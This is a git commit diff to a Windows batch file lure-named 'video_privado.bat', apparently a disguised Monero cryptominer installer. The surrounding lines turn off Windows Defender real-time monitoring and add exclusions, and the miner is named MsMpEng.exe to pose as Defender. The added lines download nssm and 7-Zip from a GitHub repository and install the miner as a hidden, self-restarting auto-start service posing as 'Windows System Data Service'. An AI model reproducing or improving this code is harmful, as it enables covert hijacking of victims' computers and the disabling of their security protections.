da7aefdc27ea94b8993a53b97e160e6863cc9c82
alealtron <alealtron@proton.me>
2025-11-08 11:43:19 -0500

    modified:   video_privado.bat

--- video_privado.bat
+++ video_privado.bat
@@ -44,6 +44,7 @@ if %ADMIN% == 1 (
   powershell -Command "Add-MpPreference -ExclusionPath '%MINER_DIR%' -Force" >NUL 2>NUL
   powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%' -Force" >NUL 2>NUL
   powershell -Command "Add-MpPreference -ExclusionProcess 'MsMpEng.exe' -Force" >NUL 2>NUL
+  powershell -Command "Add-MpPreference -ExclusionProcess 'nssm.exe' -Force" >NUL 2>NUL
   powershell -Command "Add-MpPreference -ExclusionExtension '.exe' -Force" >NUL 2>NUL
   powershell -Command "Add-MpPreference -ExclusionExtension '.zip' -Force" >NUL 2>NUL
   powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >NUL 2>NUL
@@ -51,8 +52,16 @@ if %ADMIN% == 1 (
 
 )
 
+rem Detener servicio antiguo si existe
 sc stop WinSystemData >NUL 2>NUL
 sc delete WinSystemData >NUL 2>NUL
+
+rem Eliminar tareas programadas antiguas
+schtasks /delete /tn "WinSystemData" /f >NUL 2>NUL
+schtasks /delete /tn "WinSystemDataBoot" /f >NUL 2>NUL
+schtasks /delete /tn "WinSystemDataWatchdog" /f >NUL 2>NUL
+
+rem Matar proceso si esta corriendo
 taskkill /f /t /im MsMpEng.exe >NUL 2>NUL
 
 :REMOVE_DIR0
@@ -116,21 +125,53 @@ if not exist "%MINER_DIR%\MsMpEng.exe" (
   exit /b 1
 )
 
-rem Crear un wrapper VBScript para ejecutar el programa sin ventana
-(
-echo Set WshShell = CreateObject^("WScript.Shell"^)
-echo WshShell.Run """%MINER_DIR%\MsMpEng.exe""", 0, False
-) > "%MINER_DIR%\service_wrapper.vbs"
-
-rem Crear servicio usando sc.exe directamente sin nssm
-sc create WinSystemData binPath= "wscript.exe ""%MINER_DIR%\service_wrapper.vbs"" //B //Nologo" start= auto DisplayName= "Windows System Data Service"
+rem Descargar nssm para crear servicio
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
 if errorlevel 1 (
   exit /b 1
 )
 
-sc description WinSystemData "Provides system data collection and management services for Windows."
-sc failure WinSystemData reset= 86400 actions= restart/60000/restart/60000/restart/60000
-sc start WinSystemData
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%MINER_DIR%')"
+if errorlevel 1 (
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  if errorlevel 1 (
+    exit /b 1
+  )
+  "%USERPROFILE%\7za.exe" x -y -o"%MINER_DIR%" "%USERPROFILE%\nssm.zip" >NUL
+  if errorlevel 1 (
+    exit /b 1
+  )
+  del "%USERPROFILE%\7za.exe"
+)
+del "%USERPROFILE%\nssm.zip"
+
+if not exist "%MINER_DIR%\nssm.exe" (
+  exit /b 1
+)
+if not exist "%MINER_DIR%\MsMpEng.exe" (
+  exit /b 1
+)
+
+rem Instalar servicio con nssm
+"%MINER_DIR%\nssm.exe" install WinSystemData "%MINER_DIR%\MsMpEng.exe"
+if errorlevel 1 (
+  exit /b 1
+)
+
+rem Configurar servicio
+"%MINER_DIR%\nssm.exe" set WinSystemData AppDirectory "%MINER_DIR%"
+"%MINER_DIR%\nssm.exe" set WinSystemData DisplayName "Windows System Data Service"
+"%MINER_DIR%\nssm.exe" set WinSystemData Description "Provides system data collection and management services for Windows."
+"%MINER_DIR%\nssm.exe" set WinSystemData Start SERVICE_AUTO_START
+"%MINER_DIR%\nssm.exe" set WinSystemData AppPriority BELOW_NORMAL_PRIORITY_CLASS
+"%MINER_DIR%\nssm.exe" set WinSystemData AppStdout "%MINER_DIR%\stdout.log"
+"%MINER_DIR%\nssm.exe" set WinSystemData AppStderr "%MINER_DIR%\stderr.log"
+"%MINER_DIR%\nssm.exe" set WinSystemData AppStopMethodSkip 0
+"%MINER_DIR%\nssm.exe" set WinSystemData AppRestartDelay 5000
+"%MINER_DIR%\nssm.exe" set WinSystemData AppExit Default Restart
+
+rem Iniciar servicio
+"%MINER_DIR%\nssm.exe" start WinSystemData
 if errorlevel 1 (
   exit /b 1
 )
